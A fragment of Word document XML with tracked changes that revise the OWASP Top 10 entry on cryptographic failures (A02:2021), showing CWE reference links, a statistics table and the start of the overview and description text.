          </w:rPr>
          <w:t>Resources](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/913.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41560032" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="598" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="599" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-922: Insecure Storage of Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Information](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/922.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B525695" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="600" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="601" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- 5[CWE-1275: Sensitive Cookie with Improper </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SameSite</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attribute](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1275.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="40D0527E" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F986BD"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09B2C7C5"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"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA69281" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A02:2021 – Cryptographic Failures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534F32B5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A02:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20592D69"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182FDEF4"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49BABB34"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#A02:2021 – Cryptographic Failures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[icon](assets/TOP_10_Icons_Final_Crypto_Failures.png){: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name="Cryptographic Failures", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.3") }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BACA557" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="494FC037" w14:textId="7EE03975" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="602" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="603" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"># A3:2017 </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="138DCE02" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="604" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="605" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## Factors </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4224D5E7" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="606" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A2EDB15" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="607" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="608"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12977824" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="609" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="610" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57E8C9CE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="611" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="612" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">| 29          | 46.44%             | 4.49%              |7.29                 | 6.81                </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|  79.33</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>%       | 34.85%       | 233,788           | 3,075      |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1892BDAD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="613" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50836785" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="614" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="615" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5C2732B4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="616" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66D117FA" w14:textId="7B094AAA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="617" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="618" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Shifting up one position to #2, previously known as *</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Sensitive Data</w:t>
      </w:r>
      <w:del w:id="619" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7E91C3EF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Exposure</w:t>
      </w:r>
      <w:ins w:id="620" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*, which is more of a broad symptom rather than a root cause,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E82640E" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="621" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B453025" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="622" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="623" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness | Impacts |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0854EB17" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="624" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="625" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3CCB7732" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="626" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="627" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 2 | Prevalence 3 : Detectability 2 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="64A88896" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="628" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="629" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Rather than directly attacking crypto, attackers steal keys, execute man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user’s client, e.g. browser. A manual attack is generally required. Previously retrieved password databases could be brute forced by Graphics Processing Units (GPUs). | Over the last few years, this has been the most common impactful attack. The most common flaw is simply not encrypting sensitive data. When crypto is employed, weak key generation and management, and weak algorithm, protocol and cipher usage is common, particularly for weak password hashing storage techniques. For data in transit, server side weaknesses are mainly easy to detect, but hard for data at rest. | Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive personal information (PII) data such as health records, credentials, personal data, and credit cards, which often require protection as defined by laws or regulations such as the EU GDPR or local privacy laws. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="308CD103" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="630" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="253B36DC" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="631" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="632" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6BB4566F" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="633" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39169A2A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="634" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="635" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the focus is on failures related to cryptography (or lack thereof).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="33251E4B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="636" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="637" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Which often lead to exposure of sensitive data. Notable Common Weakness Enumerations (CWEs) included</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3207DF57" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="638" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="639" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>are *CWE-259: Use of Hard-coded Password*, *CWE-327: Broken or Risky</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="730FDA01" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="640" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="641" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Crypto Algorithm*, and *CWE-331 Insufficient Entropy*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="422B4A8E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="642" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11D7FC89" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="643" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="644" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## Description </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25FFCA2B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="645" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FBA883" w14:textId="0064C93A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="646" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The first thing is to determine the protection needs of data in transit</w:t>
      </w:r>
      <w:del w:id="647" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
